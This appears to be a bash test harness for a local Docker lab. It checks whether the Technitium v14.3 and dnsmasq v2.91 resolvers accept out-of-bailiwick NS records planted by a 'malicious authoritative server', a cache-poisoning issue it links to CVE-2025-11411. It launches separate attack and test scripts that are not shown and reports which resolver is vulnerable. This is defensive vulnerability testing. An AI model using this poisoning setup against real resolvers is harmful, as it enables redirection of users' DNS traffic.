#!/bin/bash
#
# DNS Authority-NS-RDATA cache poisoning — full one-shot test
#
# Checks whether Technitium and dnsmasq enforce bailiwick rules: when the real
# attacker.lab authority returns victim.lab NS records in Authority, do resolvers
# refuse to cache those out-of-bailiwick NS records?
#

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

TOKEN="43ba1641d67c84d0e3bc3b1308a40efad0fb404e4cbd96a4a6ddf23db36f113c"
MALICIOUS_PID=""

cleanup() {
    if [ -n "$MALICIOUS_PID" ] && kill -0 "$MALICIOUS_PID" 2>/dev/null; then
        echo -e "\n${CYAN}[cleanup] stopping malicious authoritative server (PID $MALICIOUS_PID)${NC}"
        kill "$MALICIOUS_PID" 2>/dev/null
        wait "$MALICIOUS_PID" 2>/dev/null
    fi
}
trap cleanup EXIT

echo -e "${CYAN}============================================================${NC}"
echo -e "${CYAN} DNS Authority-NS-RDATA cache poisoning — full test${NC}"
echo -e "${CYAN} Focus: bailiwick check (same class as CVE-2025-11411)${NC}"
echo -e "${CYAN}============================================================${NC}"

# ── Step 0: Preconditions ──
echo -e "\n${YELLOW}[setup] checking environment...${NC}"

if ! docker ps --format '{{.Names}}' | grep -q "^bind9$"; then
    echo -e "${RED}[error] bind9 container is not running${NC}"; exit 1
fi
if ! docker ps --format '{{.Names}}' | grep -q "^technitium$"; then
    echo -e "${RED}[error] technitium container is not running${NC}"; exit 1
fi
if ! docker ps --format '{{.Names}}' | grep -q "^dnsmasq$"; then
    echo -e "${RED}[error] dnsmasq container is not running${NC}"; exit 1
fi
echo -e "  ✓ all containers running"

python3 -c "import dns.message" 2>/dev/null || { echo -e "${RED}[error] dnspython not installed${NC}"; exit 1; }
echo -e "  ✓ dnspython available"

# ── Step 1: Start malicious authoritative server ──
echo -e "\n${YELLOW}[Step 1] starting malicious authoritative server (port 9953)...${NC}"
python3 "$SCRIPT_DIR/malicious_auth_server.py" --port 9953 &
MALICIOUS_PID=$!
sleep 2

if ! kill -0 "$MALICIOUS_PID" 2>/dev/null; then
    echo -e "${RED}[error] failed to start malicious server${NC}"
    exit 1
fi
echo -e "  ✓ malicious authoritative server started (PID $MALICIOUS_PID)"

# ── Step 2: Flush caches ──
echo -e "\n${YELLOW}[Step 2] flushing resolver caches...${NC}"
curl -s "http://localhost:5380/api/cache/flush?token=$TOKEN" > /dev/null 2>&1
echo -e "  ✓ Technitium cache flushed"
docker restart dnsmasq > /dev/null 2>&1
sleep 2
echo -e "  ✓ dnsmasq restarted (cache cleared)"

# ── Step 3: Quick connectivity ──
echo -e "\n${YELLOW}[Step 3] connectivity check...${NC}"
RESULT=$(dig @127.0.0.1 -p 5320 www.victim.lab A +short +timeout=5 2>/dev/null)
if [ "$RESULT" = "1.2.3.4" ]; then
    echo -e "  ✓ Technitium → www.victim.lab = $RESULT"
else
    echo -e "  ${RED}✗ Technitium → www.victim.lab = $RESULT (expected 1.2.3.4)${NC}"
fi

RESULT=$(dig @127.0.0.1 -p 5322 www.victim.lab A +short +timeout=5 2>/dev/null)
if [ "$RESULT" = "1.2.3.4" ]; then
    echo -e "  ✓ dnsmasq → www.victim.lab = $RESULT"
else
    echo -e "  ${RED}✗ dnsmasq → www.victim.lab = $RESULT (expected 1.2.3.4)${NC}"
fi

# ── Step 4: Test Technitium ──
echo -e "\n${YELLOW}[Step 4] testing Technitium (port 5320)...${NC}"
TECH_RESULT=0
python3 "$SCRIPT_DIR/test_cache_poison.py" \
    --target-ip 127.0.0.1 --target-port 5320 --target-name "Technitium" \
    --wait 3 || TECH_RESULT=$?

# Flush Technitium cache so dnsmasq test is not affected
curl -s "http://localhost:5380/api/cache/flush?token=$TOKEN" > /dev/null 2>&1

# ── Step 5: Test dnsmasq ──
echo -e "\n${YELLOW}[Step 5] testing dnsmasq (port 5322)...${NC}"

docker restart dnsmasq > /dev/null 2>&1
sleep 2

DNSMASQ_RESULT=0
python3 "$SCRIPT_DIR/test_cache_poison.py" \
    --target-ip 127.0.0.1 --target-port 5322 --target-name "dnsmasq" \
    --wait 3 || DNSMASQ_RESULT=$?

# ── Summary ──
echo -e "\n${CYAN}============================================================${NC}"
echo -e "${CYAN} Test summary${NC}"
echo -e "${CYAN}============================================================${NC}"
echo ""
if [ $TECH_RESULT -ne 0 ]; then
    echo -e "  Technitium v14.3:  ${RED}⚠ VULNERABLE${NC}"
else
    echo -e "  Technitium v14.3:  ${GREEN}✓ NOT VULNERABLE${NC}"
fi

if [ $DNSMASQ_RESULT -ne 0 ]; then
    echo -e "  dnsmasq v2.91:     ${RED}⚠ VULNERABLE${NC}"
else
    echo -e "  dnsmasq v2.91:     ${GREEN}✓ NOT VULNERABLE${NC}"
fi
echo ""
echo -e "${CYAN}============================================================${NC}"
